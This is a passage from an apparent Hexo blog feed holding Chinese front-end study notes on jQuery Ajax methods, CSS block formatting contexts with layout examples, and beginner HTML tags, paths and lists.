<td><code>url</code></td>
<td><code>String</code></td>
<td>请求<code>HTML</code>页面的<code>URL</code>地址</td>
</tr>
<tr>
<td><code>data(可选)</code></td>
<td><code>Object</code></td>
<td>发送至服务器的<code>key</code> / <code>value</code>数据</td>
</tr>
<tr>
<td><code>callback(可选)</code></td>
<td><code>Function</code></td>
<td>请求完成时的回调函数，无论是请求成功还是失败</td>
</tr>
</tbody>
</table>
<h5 id="get和post方法"><a class="markdownIt-Anchor" href="#get和post方法"></a> <code>$.get()</code>和<code>$.post()</code>方法</h5>
<hr />
<p><code>load()</code>方法通常用来从web服务器上获取静态的数据文件。在项目中需要传递一些参数给服务器中的页面，那么可以使用<code>$.get()</code>和<code>$.post()</code>或<code>$.ajax()</code>方法</p>
<ul>
<li>
<p>注意：<code>$.get()</code>和<code>$.post()</code>方法是<code>jquery</code>中的全局函数</p>
</li>
<li>
<p><strong>$.get()方法</strong></p>
<ul>
<li><code>$.get()</code>方法使用<code>GET</code>方式来进行异步请求</li>
<li>结构为：<code>$.get(url,[data],callback,type)</code>
<ul>
<li>如果服务器返回的内容格式是<code>xml</code>文档，需要在服务器端设置<code>Content-Type</code>类型 代码如下：<code>header(&quot;Content-Type:text/xml:charset=utf-8&quot;)</code> //<code>php</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><code>$.get()</code>方法参数解析</strong></p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>url</code></td>
<td><code>String</code></td>
<td>请求<code>HTML</code>页的地址</td>
</tr>
<tr>
<td><code>data(可选)</code></td>
<td><code>Object</code></td>
<td>发送至服务器的<code>key</code>/ <code>value</code> 数据会作为<code>QueryString</code>附加到请求URL中</td>
</tr>
<tr>
<td><code>callback(可选)</code></td>
<td><code>Function</code></td>
<td>载入成功的回调函数（只有当<code>Response</code>的返回状态是success才调用该方法）</td>
</tr>
<tr>
<td><code>type(可选)</code></td>
<td><code>String</code></td>
<td>服务器返回内容的格式，包括<code>xml</code>、<code>html</code>、<code>script</code>、<code>json</code>、<code>text</code>和<code>_default</code></td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>$.post()方法</strong></p>
<ul>
<li>它与<code>$.get()</code>方法的结构和使用方式相同，有如下区别
<ul>
<li><code>GET</code>请求会将参数跟张乃URL后进行传递，而<code>POST</code>请求则是作为<code>Http</code>消息的实体内容发送给web服务器，在<code>ajax</code>请求中，这种区别对用户不可见</li>
<li><code>GET</code>方式对传输数据有大小限制（通常不能大于<code>2KB</code>），而使用<code>POST</code>方式传递的数据量要比<code>GET</code>方式大得多（理论不受限制）</li>
<li><code>GET</code>方式请求的数据会被浏览器缓存起来，因此其他人可以从浏览器的历史纪录中读取这些数据，如：账号、密码。在某种情况下，<code>GET</code>方式会带来严重的安全问题，而<code>POST</code>相对来说可以避免这些问题</li>
<li><code>GET</code>和<code>POST</code>方式传递的数据在服务端的获取也不相同。在<code>PHP</code>中，<code>GET</code>方式用<code>$_GET[]</code>获取；<code>POST</code>方式用<code>$_POST[]</code>获取;两种方式都可用<code>$_REQUEST[]</code>来获取</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>总结</strong></p>
<ul>
<li>使用<code>load()</code>、<code>$.get()</code>和<code>$.post()</code>方法完成了一些常规的<code>Ajax</code>程序，如果还需要复杂的<code>Ajax</code>程序，就需要用到<code>$.ajax()</code>方式</li>
</ul>
</li>
</ul>
<h5 id="ajax方法"><a class="markdownIt-Anchor" href="#ajax方法"></a> $.ajax()方法</h5>
<hr />
<ul>
<li><code>$.ajax()</code>方法是<code>jquery</code>最底层的<code>Ajax</code>实现，它的结构为<code>$.ajax(options)</code></li>
<li>该方法只有一个参数，但在这个对象里包含了<code>$.ajax()</code>方式所需要的请求设置以及回调函等信息，参数以<code>key</code> / <code>value</code>存在，所有参数都是可选的</li>
<li><strong>$.ajax()方式常用参数解析</strong></li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>url</code></td>
<td><code>String</code></td>
<td>(默认为当前页地址)发送请求的地址</td>
</tr>
<tr>
<td><code>type</code></td>
<td><code>String</code></td>
<td>请求方式（<code>POST</code>或<code>GET</code>）默认为<code>GET</code></td>
</tr>
<tr>
<td><code>timeout</code></td>
<td><code>Number</code></td>
<td>设置请求超时时间（毫秒）</td>
</tr>
<tr>
<td><code>dataType</code></td>
<td><code>String</code></td>
<td>预期服务器返回的类型。可用的类型如下<br /><br /> <strong>xml</strong>:返回<code>XML</code>文档，可用<code>jquery</code>处理<br /><strong>html</strong>:返回纯文本的<code>HTML</code>信息，包含的<code>script</code>标签也会在插入<code>DOM</code>时执行<br /><strong>script</strong>：返回纯文本的<code>javascript</code>代码。不会自动缓存结果，除非设置<code>cache</code>参数。注意：在远程请求时，所有的<code>POST</code>请求都将转为<code>GET</code>请求<br /><strong>json</strong>:返回<code>JSON</code>数据<br /><strong>jsonp</strong>:<code>JSONP</code>格式，使用<code>jsonp</code>形式调用函数时，例如：<code>myurl?call back=?,jquery</code>将自动替换后一个<code>？</code>为正确的函数名，以执行回调函数<br /><strong>text</strong>:返回纯文本字符串</td>
</tr>
<tr>
<td><code>beforeSend</code></td>
<td><code>Function</code></td>
<td>发送请求前可以修改<code>XMLHttpRequest</code>对象的函数，例如添加自定义<code>HTTP</code>头。在<code>beforeSend</code>中如果返回<code>false</code>可以取消本次<code>Ajax</code>请求。<code>XMLHttpRequest</code>对象是唯一的参数<br /> function(XMLHttpRequest){<br />          <code>this</code>;//调用本次<code>Ajax</code>请求时传递的<code>options</code>参数<br>}</td>
</tr>
<tr>
<td><code>complete</code></td>
<td><code>Function</code></td>
<td>请求完成后的回调函数（请求成功或失败时都调用）<br /> 参数：<code>XMLHttpRequest</code>对象和一个描述成功请求类型的字符串<br />function(XMLHttpRequest,textStatus){<br>         <code>this</code>;//调用本次Ajax请求时传递的<code>options</code>参数<br>}</td>
</tr>
<tr>
<td><code>success</code></td>
<td><code>Function</code></td>
<td>请求成功后调用的回调函数，有两个参数<br />(1)由服务器返回，并根据<code>dataTyppe</code>参数进行处理后的数据<br />(2)描述状态的字符串<br /><code>function</code>(data,textStatus){<br>         //<code>data</code>可能是<code>xmlDoc</code>、<code>jsonObj</code>、<code>html</code>、<code>text</code>等<br>         <code>this</code>;//调用本次<code>Ajax</code>请求时传递的<code>options</code>参数<br />}</td>
</tr>
<tr>
<td><code>error</code></td>
<td><code>Function</code></td>
<td>请求失败时被调用的函数</td>
</tr>
<tr>
<td><code>global</code></td>
<td><code>Boolean</code></td>
<td>默认为<code>true</code>。表示是否触发全局<code>Ajax</code>事件，设置为<code>false</code>将不会触发。<code>AjaxStart</code>或<code>AjaxStop</code>可用于控制各种<code>Ajax</code>事件</td>
</tr>
</tbody>
</table>
<ul>
<li>参考
<ul>
<li>锋利的<code>jQuery</code></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS中的BFC</title>
    <url>/hexolog/post/3c61eba.html</url>
    <content><![CDATA[<h3 id="bfc-是什么"><a class="markdownIt-Anchor" href="#bfc-是什么"></a> BFC 是什么？</h3>
<ul>
<li><code>BFC</code> (<code>Block Formatting Contexts</code>) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，<code>BFC</code> 可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 <code>BFC</code> 具有普通容器没有的一些特性，例如可以包含浮动元素，使到它可以包含浮动元素，从而防止出现高度塌陷的问题</li>
</ul>
<h2 id="-more-"><a class="markdownIt-Anchor" href="#-more-"></a> <a id="more"></a></h2>
<h3 id="如何触发-bfc"><a class="markdownIt-Anchor" href="#如何触发-bfc"></a> 如何触发 BFC</h3>
<ul>
<li>
<p>触发 BFC 的条件</p>
<ul>
<li>浮动元素，<code>float</code> 除 <code>none</code> 以外的值</li>
<li>绝对定位元素，<code>position</code>（<code>absolute</code>，<code>fixed</code>）</li>
<li><code>display</code> 为以下其中之一的值 <code>inline-blocks</code>，<code>table-cells</code>，<code>table-captions</code></li>
<li><code>overflow</code> 除了 <code>visible</code> 以外的值（<code>hidden</code>，<code>auto</code>，<code>scroll</code>）</li>
</ul>
</li>
<li>
<p>在 <code>CSS3</code> 中，<code>BFC</code> 叫做 <code>Flow Root</code>，并增加了一些触发条件：</p>
<ul>
<li><code>display</code> 的 <code>table-caption</code> 值</li>
<li><code>position</code> 的 <code>fixed</code> 值，其实 <code>fixed</code> 是 <code>absolute</code> 的一个子类，因此在 <code>CSS2.1</code> 中使用这个值也会触发 <code>BFC</code> ，只是在 <code>CSS3</code> 中更加明确了这一点</li>
</ul>
</li>
</ul>
<hr />
<h3 id="bfc布局规则"><a class="markdownIt-Anchor" href="#bfc布局规则"></a> BFC布局规则</h3>
<ul>
<li>内部的<code>Box</code>会在垂直方向，一个接一个地放置。</li>
<li><code>Box</code>垂直方向的距离由<code>margin</code>决定。属于同一个<code>BFC</code>的两个相邻<code>Box</code>的<code>margin</code>会发生重叠</li>
<li>每个元素的<code>margin box</code>的左边， 与包含块<code>border box</code>的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如 此。</li>
<li><code>BFC</code>的区域不会与<code>float box</code>重叠。</li>
<li><code>BFC</code>就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</li>
<li>计算<code>BFC</code>的高度时，浮动元素也参与计算</li>
</ul>
<hr />
<h3 id="bfc的作用及原理"><a class="markdownIt-Anchor" href="#bfc的作用及原理"></a> BFC的作用及原理</h3>
<ul>
<li><strong>自适应两栏布局</strong></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">       <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">       <span class="attribute">position</span>: relative;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.aside</span> &#123;</span><br><span class="line">       <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">       <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">       <span class="attribute">float</span>: left;</span><br><span class="line">       <span class="attribute">background</span>: <span class="number">#f66</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.main</span> &#123;</span><br><span class="line">       <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">       <span class="attribute">background</span>: <span class="number">#fcc</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p1.qhimg.com/d/inn/4055c62a/4dca44a927d4c1ffc30e3ae5f53a0b79.png" alt="" /></p>
<ul>
<li>
<p>根据BFC布局规则第3条：</p>
<ul>
<li>每个元素的<code>margin box</code>的左边， 与包含块<code>border box</code>的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li>
</ul>
</li>
<li>
<p>因此，虽然存在浮动的元素<code>aslide</code>，但<code>main</code>的左边依然会与包含块的左边相接触</p>
</li>
<li>
<p>根据<code>BFC</code>布局规则第四条：</p>
<ul>
<li><code>BFC</code>的区域不会与<code>float box</code>重叠</li>
</ul>
</li>
<li>
<p>我们可以通过通过触发<code>main</code>生成<code>BFC</code>， 来实现自适应两栏布局</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当触发<code>main</code>生成<code>BFC</code>后，这个新的<code>BFC</code>不会与浮动的<code>aside</code>重叠。因此会根据包含块的宽度，和<code>aside</code>的宽度，自动变窄。效果如下：</li>
</ul>
<p><img src="http://p6.qhimg.com/t01077886a9706cb26b.png" alt="" /></p>
<ul>
<li><strong>清除内部浮动</strong></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.par</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#fcc</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.child</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#f66</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"par"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p1.qhimg.com/t016035b58195e7909a.png" alt="" /></p>
<ul>
<li>根据<code>BFC</code>布局规则第六条：
<ul>
<li>计算<code>BFC</code>的高度时，浮动元素也参与计算</li>
</ul>
</li>
<li>为达到清除内部浮动，我们可以触发<code>par</code>生成<code>BFC</code>，那么<code>par</code>在计算高度时，<code>par</code>内部的浮动元素<code>child</code>也会参与计算</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.par</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://p2.qhimg.com/t016bbbe5236ef1ffd5.png" alt="" /></p>
<ul>
<li><strong>防止垂直 margin 重叠</strong></li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f55</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fcc</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Haha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hehe<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p5.qhimg.com/t01b47b8b7d153c07cc.png" alt="" /></p>
<ul>
<li>两个<code>p</code>之间的距离为<code>100px</code>，发送了<code>margin</code>重叠</li>
<li>根据BFC布局规则第二条：
<ul>
<li><code>Box</code>垂直方向的距离由<code>margin</code>决定。属于同一个<code>BFC</code>的两个相邻Box的<code>margin</code>会发生重叠</li>
</ul>
</li>
<li>我们可以在<code>p</code>外面包裹一层容器，并触发该容器生成一个<code>BFC</code>。那么两个<code>P</code>便不属于同一个<code>BFC</code>，就不会发生<code>margin</code>重叠了</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.wrap</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f55</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fcc</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Haha<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hehe<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p3.qhimg.com/t0118d1d2badbb00521.png" alt="" /></p>
<hr />
<h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3>
<ul>
<li>其实以上的几个例子都体现了<code>BFC</code>布局规则第五条
<ul>
<li><code>BFC</code>就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此</li>
</ul>
</li>
<li>因为<code>BFC</code>内部的元素和外部的元素绝对不会互相影响，因此， 当<code>BFC</code>外部存在浮动时，它不应该影响<code>BFC</code>内部<code>Box</code>的布局，<code>BFC</code>会通过变窄，而不与浮动有重叠。同样的，当<code>BFC</code>内部有浮动时，为了不影响外部元素的布局，<code>BFC</code>计算高度时会包括浮动的高度。避免<code>margin</code>重叠也是这样的一个道理</li>
</ul>
<hr />
<h3 id="相关阅读"><a class="markdownIt-Anchor" href="#相关阅读"></a> 相关阅读</h3>
<ul>
<li><a href="http://www.iyunlu.com/view/css-xhtml/55.html" target="_blank" rel="noopener">那些年我们一起清除过的浮动</a></li>
<li><a href="https://juejin.im/entry/584f9d3a61ff4b006cd9dff8" target="_blank" rel="noopener">BFC 深入理解</a></li>
<li>Thierry Koblentz 的-<a href="http://www.cssmojo.com/clearfix_block-formatting-context_and_hasLayout/" target="_blank" rel="noopener">Everything you Know about Clearfix is Wrong</a></li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DIV+CSS系统学习笔记回顾</title>
    <url>/hexolog/post/96b1bc20.html</url>
    <content><![CDATA[<h3 id="第一部分-html"><a class="markdownIt-Anchor" href="#第一部分-html"></a> 第一部分 HTML</h3>
<hr />
<h4 id="第一章-职业规划和前景"><a class="markdownIt-Anchor" href="#第一章-职业规划和前景"></a> 第一章 职业规划和前景</h4>
<hr />
<ul>
<li>
<p><strong>职业方向规划定位：</strong></p>
<ul>
<li><code>web</code>前端开发工程师</li>
<li><code>web</code>网站架构师</li>
<li>自己创业</li>
<li>转岗管理或其他</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li>
<p><strong><code>web</code>前端开发的前景展望：</strong></p>
<ul>
<li>未来<code>IT</code>行业企业需求最多的人才</li>
<li>结合最新的<code>html5</code>抢占移动端的市场</li>
<li>自己创业做老板</li>
<li>随着互联网的普及<code>web</code>开发成为企业的宠儿和核心</li>
</ul>
</li>
<li>
<p><strong><code>web</code>职业发展目标：</strong></p>
</li>
<li>
<p>第一、梳理知识架构</p>
<ul>
<li>负责内容的<code>HTML</code></li>
<li>负责外观的<code>css</code>（层叠样式表）</li>
<li>负责行为的<code>js</code></li>
<li><code>ps</code>切图</li>
</ul>
</li>
<li>
<p>第二、分解目标（起步阶段、提升阶段、成型阶段）</p>
<ul>
<li>
<p>起步阶段：</p>
<ul>
<li>基本知识的掌握</li>
<li>常用工具的掌握</li>
<li>沟通技巧的掌握（围绕客户的需求）</li>
<li>良好的开发习惯（加注释、对齐方式）</li>
</ul>
</li>
<li>
<p>提升阶段：</p>
<ul>
<li>熟悉掌握<code>HTML</code>基本标签和属性</li>
<li>熟练掌握<code>css</code>的基本语法和使用</li>
<li>浏览器兼容和w3c标准的掌握</li>
<li>结合<code>html</code>+<code>css</code>+<code>js</code>开始系统项目的开发</li>
</ul>
</li>
<li>
<p>成型阶段：</p>
<ul>
<li>精通<code>DIV</code>+<code>CCS</code>布局</li>
<li>精通<code>css</code>样式表控制<code>html</code>标签</li>
<li>熟悉运用<code>js</code>制作动态网站的效果</li>
<li>能独立开发完成网站</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第二章-html基本结构"><a class="markdownIt-Anchor" href="#第二章-html基本结构"></a> 第二章 html基本结构</h4>
<hr />
<ul>
<li>
<p>认识HTML：</p>
<ul>
<li><code>html</code>不是一种编程语言，是一种标志语言</li>
<li>标记语言是由一套标识标签组成的</li>
<li><code>html</code>使用标签来描述网页</li>
</ul>
</li>
<li>
<p><code>html</code>结构：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>不成对出现的标签<br />
<code>&lt;br&gt;</code> <code>&lt;hr&gt;</code>  <code>&lt;meta&gt;</code> <code>&lt;img&gt;</code>  <code>&lt;input..&gt;</code>  <code>&lt;option..&gt;</code>  <code>&lt;link&gt;</code></p>
</li>
<li>
<p><strong>HTML 基本标签的讲解：</strong></p>
<ul>
<li>
<p><code>&lt;html&gt;</code> <code>&lt;head&gt;</code> <code>&lt;body&gt;</code>标签</p>
</li>
<li>
<p><code>&lt;h1&gt;</code>----<code>&lt;h6&gt;</code>仅仅用于标题文本，不要为了产生粗体文本使用它们</p>
</li>
<li>
<p><code>&lt;p&gt;</code>标签  段落标签</p>
</li>
<li>
<p><code>&lt;strong&gt;&lt;b&gt;</code>标签</p>
</li>
<li>
<p>都会让文字产生加粗效果</p>
<ul>
<li><code>&lt;strong&gt;</code>用于强调文本，强度更深，表示重要文本—&gt;用于<code>SEO</code>优化</li>
<li><code>&lt;b&gt;</code>只是视觉加粗效果—&gt;单纯为了产生加粗</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>&lt;em&gt;</code> <code>&lt;i&gt;</code>标签</p>
<ul>
<li><code>em</code>用于强调文本</li>
<li><code>i</code>只是视觉斜体效果</li>
<li><code>&lt;strong&gt;</code>比<code>&lt;em&gt;</code>强调更强</li>
</ul>
</li>
<li>
<p>特殊符号：</p>
<ul>
<li><code>&amp;nbsp;</code>—&gt;空格</li>
<li><code>&amp;gt;</code>—&gt;大于号</li>
<li><code>&amp;lt;</code>—&gt;小于号</li>
<li><code>&amp;quot;</code>—&gt;引号</li>
<li><code>&amp;copy;</code>—&gt;版权号</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第三章-html基本标签"><a class="markdownIt-Anchor" href="#第三章-html基本标签"></a> 第三章 html基本标签</h4>
<hr />
<ul>
<li><code>HTMl</code>基本标签：
<ul>
<li>
<p><code>span</code>标签</p>
<ul>
<li>对被用来组合文档中的行内元素</li>
<li>注意：span没有固定的格式表现，当对它应用样式时，才会产生视觉上的变化</li>
</ul>
</li>
<li>
<p><code>&lt;pre&gt;</code>标签</p>
<ul>
<li>文字的格式按源码的排版来显示，我们称之为预处理格式</li>
</ul>
</li>
<li>
<p><code>&lt;a&gt;</code>标签—&gt;他有一个必不可少的属性 href</p>
<ul>
<li><code>target</code>属性：</li>
<li><code>_self</code>(在原来页面打开)</li>
<li><code>_blank</code>（新窗口打开）</li>
<li><code>_top</code>（打开时忽略所有的框架）</li>
<li><code>_parent</code>（在父窗口中打开）</li>
</ul>
</li>
<li>
<p>创建锚点和锚链接</p>
<ul>
<li>锚点也是一种超链接，是页面内进行跳转的超链接
<ul>
<li>第一步：创建锚点 <code>&lt;a name=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></li>
<li>第二步：使用创建好的锚点名称 <code>&lt;a href=&quot;#锚点名称&quot;&gt;内容&lt;/a&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>marquee</code>标签</p>
<ul>
<li>可以创建一个内容滚动效果</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;marquee direction&#x3D;&quot;down&quot; loop&#x3D;&quot;4&quot; onmouseover&#x3D;this.stop() onmouseout&#x3D;this.start()&gt;&lt;&#x2F;marquee&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>direction</code> 表示滚动方向，取值有（left,right,up,down,默认left）</li>
<li><code>loop</code>表示滚动循环的次数，默认为无限循环</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onmouseover&#x3D;this.stop()  onmouseover&#x3D;this.start()  scrollamout&#x3D;&quot;1&quot;(滚动速度)</span><br></pre></td></tr></table></figure>
<ul>
<li>表示当鼠标移上区域的时候停止滚动，鼠标移开继续滚动</li>
</ul>
<hr />
<h4 id="第四章-img图片标签与路径"><a class="markdownIt-Anchor" href="#第四章-img图片标签与路径"></a> 第四章 img图片标签与路径</h4>
<hr />
<ul>
<li>
<p>图片标签与路径：</p>
<ul>
<li>常见图片格式 <code>jpg</code> <code>png</code> <code>gif</code></li>
<li><code>Gif</code>     （只支持全透明）</li>
<li><code>Jpeg</code> /<code>jpg</code></li>
<li><code>Png</code> 半/全透明都支持</li>
</ul>
</li>
<li>
<p>图片标签写法 ：</p>
<ul>
<li><code>&lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt;</code></li>
</ul>
</li>
<li>
<p>图片四要素：</p>
<ul>
<li><code>src=&quot;&quot;</code>        图片路径</li>
<li><code>alt=&quot;&quot;</code>       图片含义</li>
<li><code>width=&quot;&quot;</code>     图片宽度 和图片大小保持一致</li>
<li><code>height=&quot;&quot;</code>     图片高度 和图片大小保持一致</li>
<li><code>title=&quot;&quot;</code></li>
</ul>
</li>
<li>
<p>路径知识：</p>
<ul>
<li>
<p>相对路径、绝对路径：</p>
<ul>
<li>相对路径：(Relative Path) 相对于该文件的路径；</li>
<li>绝对路径：(Absolute Path) 从磁盘出发的路径；</li>
</ul>
</li>
<li>
<p><code>&lt;img src=&quot;&quot; …… align=&quot;&quot; /&gt;</code> <code>align</code>属性–设置图片与后面文字的位置关系<br />
值–<code>top</code>、<code>bottom</code>、<code>middle</code>、<code>absmiddle</code>、<code>left</code>、<code>right</code></p>
</li>
</ul>
</li>
<li>
<p>在静态页面中：</p>
<ul>
<li>
<p><code>/</code>开头表示根目录；</p>
</li>
<li>
<p><code>./</code>表示当前目录；（斜画线前面一个点）</p>
</li>
<li>
<p><code>../</code>上级目录；（斜画线前面两个点）</p>
</li>
<li>
<p>直接用文件名不带/也表示同一目录</p>
</li>
<li>
<p>这些都是相对于当前文件的位置来说的，如果用绝对路径的话就是写全了。</p>
</li>
</ul>
</li>
</ul>
<hr />
<h4 id="第五章-三种列表的讲解"><a class="markdownIt-Anchor" href="#第五章-三种列表的讲解"></a> 第五章 三种列表的讲解</h4>
<hr />
<ul>
<li>三种列表的知识讲解：
<ul>
<li><code>&lt;ul&gt;</code>无序列表
<ul>
<li>无序列表是一个没有顺序项目的列表，此列表项默认粗体圆点进行标识</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">   &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<ol>有序列表
  - 有序列表也是一列项目，只是列表项目使用的是数字进行标记。 有序列表始于 `<ol>` 标签。每个列表项始于 `<li> `标签。
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">   &lt;li&gt;内容一&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;内容二&lt;&#x2F;li&gt;</span><br><span class="line">   &lt;li&gt;内容三&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>列表符号</p>
<ul>
<li>
<p>无序列表-列表符号:</p>
<ul>
<li><code>type=&quot;circle&quot;</code>  空心圆 <code>type=“disc”</code> 实心圆  默认值 <code>type=&quot;square&quot;</code> 方块符</li>
</ul>
</li>
<li>
<p>有序列表-列表符号</p>
<ul>
<li><code>type=&quot;A&quot;</code>    A B C D</li>
